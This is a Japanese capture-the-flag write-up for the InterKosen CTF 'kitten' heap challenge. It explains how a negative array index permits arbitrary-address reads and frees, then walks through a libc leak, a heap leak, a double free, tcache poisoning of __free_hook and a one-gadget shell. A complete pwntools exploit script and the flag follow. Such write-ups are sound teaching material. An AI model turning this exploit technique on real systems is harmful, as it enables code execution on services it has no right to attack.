---
tags: pwn
---


# InterKosen CTF - kitten

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/theoremoon/InterKosenCTF2019-challenges-public>

## Writeup

### Outline

いつものcreate+edit, show, deleteが出来るHeap問題
かと思いきやポインタの管理がかなり頑丈でDouble FreeやUAFは出来ないように見える
と思いきや管理している配列に負のインデックスを指定することが出来、しかもそこに入力することが出来るので実質任意アドレスに対してdelete, showが出来る。
と、いうわけでどこかのGOTからlibcリークし、更にどこかのチャンクのアドレスもリークしてからそこをDouble Freeしていつものtcache poisoningが出来る。

### Binary

```
$ checksec ./chall
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
PIE以外全部有効、ということは`__free_hook`書き換えとGOT経由のlibc leakと思われる。

コマンドの説明の前にグローバル変数を説明する。

- kittens: 猫の名前が格納されているポインタの配列[10]
- count: 猫の数の最大値, free時にデクリメント, show, delete時にこれを超えるインデックスは指定できない、つまりUAFもDouble Freeも出来ない, 最大が10
- name: 名前用のバッファ

これらの配置は次の通り

```
name[0x7f]: 0x602020 ~ 0x60209f
kittens[0x50]: 0x6020a0 ~ 0x6020ef
count: 0x60212c
```

`count`だけ離れたところにある。`kittens`の管理がかなり厳重で10個以上のポインタを持つことは出来ない。よって`count`をオーバーフローで書き換えて大きい値にしようとしても無理。
しかし逆に小さいインデックスへのチェックがされておらず、唯一と言っていいレベルの脆弱性がある。showやdeleteのインデックス指定で負数を指定すると`kittens[-i]`のようになり、これは`0x6020a0 - i * 8`に存在する値をポインタとして見ることになる。
ここで先程の配置を見直すとなんと`name`と`kittens`は隣接している。`name`はaddで書き込みされてから次の入力まではクリアされないのでここに何らかのアドレスを名前として入力し、置いておくことでそこへshowやdeleteを行うことが出来る。

実行出来るコマンドは次の通り
- add(find): mallocして編集、サイズ可変だが0x7fまでなのでUnsorted Binに送るのは難しい
- show(feed): 中身を表示
- delete(look for): free、kittens配列の該当箇所も0クリアされるのでDouble Free出来ない(正確にはcountに相当するインデックス部分と同じ値が書き込まれる)

### 任意アドレスのshowとdelete

次のように負数インデックスを利用することで任意アドレスの中身を見たりfreeすることが出来る。

1. add(x)

```
~~ name ~~
-16: x
-15: 
...
~~ kittens ~~
0: p_0 / *p_0 = x
```

2. show(-16)

上の図のように-16インデックスに対応する箇所が`name`の先頭なので`x`をアドレスとして見た時の中身が表示される

3. delete(-16)

showと同様のことがdeleteで起こる、つまり`free(*p_0) = free(x)`が発動する。

### libc leak

上記手順で任意アドレスのshowとleakが出来るようになった。というわけでまずは`x`に何らかの関数のGOTを設定することでlibc leakが出来る。アドレス解決が出来ているなら何でもいいので`puts`を選んだ

### Heap leak

libc leakが出来たので`__free_hook`を書き換えたい。いつものDouble Freeを狙いたいが、`delete(0)`を2回叩くようなDouble Freeは出来ない。
そこで`kittens[n] = kittens[-m]`(n, mは非負整数)となるようにしてから`delete(n), delete(-m)`を叩いてDouble Freeする。`n`に当たるインデックスは通常のdeleteでfree出来るが`-m`に当たるインデックスには事前に`kittens[n]`に格納されているポインタを知る必要がある。
というわけでHeap領域のアドレスをリークする。これは単にPIE無効で`kittens`のアドレスが分かっているのでそこを上記手順でshowすれば良い。
これで得たアドレスを直前に述べた手順で違うインデックスに仕込んでそれぞれfreeすればDouble Freeでtcacheが循環する。

### いつもの

Double Freeが出来たのでいつもどおり`__free_hook`を書き換える。今回は珍しくOne Gadgetを使った(`system("/bin/sh")`する際に`"/bin/sh"`が書き込まれているインデックスを特定するのが面倒だった)

## Code

```python
from pwn import remote, process, p64, u64, ELF


def select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def add(s, data=b"junk"):
    select(s, b"1")
    s.recvuntil(b"Name: ")
    s.sendline(data)


def show(s, idx):
    select(s, b"2")
    s.recvuntil(b"> ")
    s.sendline(str(idx))
    suffix = b": Meow!\n"
    return s.recvuntil(suffix)[:-len(suffix)]


def delete(s, idx):
    select(s, b"3")
    s.recvuntil(b"> ")
    s.sendline(str(idx))


if __name__ == '__main__':

    """
        Arch:     amd64-64-little
        RELRO:    Full RELRO
        Stack:    Canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    """
    elf = ELF("./chall")
    puts_got = elf.got["puts"]
    kittens_top = elf.symbols["kittens"]
    print(hex(kittens_top))

    libc = ELF("./libc-2.27.so")
    puts_libc = libc.symbols["puts"]
    free_hook_libc = libc.symbols["__free_hook"]
    system_libc = libc.symbols["system"]
    one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]

    s = remote("localhost", 9005)
    add(s, p64(puts_got))
    libc_base = u64(show(s, -16).ljust(8, b"\x00")) - puts_libc
    print(hex(libc_base))

    add(s, p64(kittens_top))
    heap_addr = u64(show(s, -16).ljust(8, b"\x00"))
    print(hex(heap_addr))

    add(s, p64(heap_addr))
    delete(s, 0)
    delete(s, -16)
    add(s, p64(libc_base + free_hook_libc))
    add(s)
    add(s, p64(libc_base + one_gadget[1]))

    delete(s, 0)

    s.interactive()

```

## Flag

Docker環境が配られていたのでそれでやりました
`KosenCTF{00b_4nd_tc4ch3_p01s0n1ng}`

## 公式Writeup

* https://hackmd.io/@theoldmoon0602/rJf0IS9mB

## 感想

任意アドレスをfree出来ることに気付いてtcacheに直接`__free_hook`のアドレスを送れるのでは?と思ったが冷静に考えるとチャンクのサイズヘッダを考慮していないので出来るわけがない。最初のスタック地点はここだった(すぐ気付いたので良かった)

最後のDouble Freeをするところで同じインデックス(-16)を2回freeしていたが1回目で`kittens[idx]`がクリアされてしまい、同じインデックスだとDouble Free出来ない罠に引っかかった。
ここで詰まったので当日解けた弊チームのWriteupをチーム内Wikiから探して読んだ以外は無事に自力でなんとかなったので良かったです(ノーヒントで解けてから言いたい)。

って思ったら普通に自分のメモに同一インデックスのDouble Freeは不可って書いてあった、過去の自分は自分で書いたメモぐらい見返して欲しい。